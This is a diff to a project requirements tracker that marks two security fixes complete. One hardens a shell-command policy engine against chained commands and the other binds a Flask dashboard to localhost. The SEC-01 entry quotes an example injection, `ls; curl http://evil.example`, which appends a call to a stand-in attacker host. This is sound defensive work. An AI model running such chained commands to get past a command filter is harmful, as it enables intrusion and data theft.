@@ -18,8 +18,8 @@
 
 ### Security Fixes (SEC)
 
-- [ ] **SEC-01**: A test reproduces that a chained shell command (e.g. `ls; curl http://evil.example`) passes the policy engine today, and after the fix every sub-command of `;`, `&&`, `||`, `|`, `$(…)` and backticks is checked and the chain is blocked
-- [ ] **SEC-02**: The dashboard binds to 127.0.0.1 with Flask debug mode off by default
+- [x] **SEC-01**: A test reproduces that a chained shell command (e.g. `ls; curl http://evil.example`) passes the policy engine today, and after the fix every sub-command of `;`, `&&`, `||`, `|`, `$(…)` and backticks is checked and the chain is blocked
+- [x] **SEC-02**: The dashboard binds to 127.0.0.1 with Flask debug mode off by default
 
 ### Local From-Scratch Model (SCRATCH)
 
@@ -87,8 +87,8 @@
 | EVAL-06 | Phase 1 | Pending |
 | EVAL-07 | Phase 1 | Pending |
 | EVAL-08 | Phase 4 | Pending |
-| SEC-01 | Phase 1 | Pending |
-| SEC-02 | Phase 1 | Pending |
+| SEC-01 | Phase 1 | Complete |
+| SEC-02 | Phase 1 | Complete |
 | SCRATCH-01 | Phase 2 | Pending |
 | SCRATCH-02 | Phase 2 | Pending |
 | SCRATCH-03 | Phase 2 | Pending |
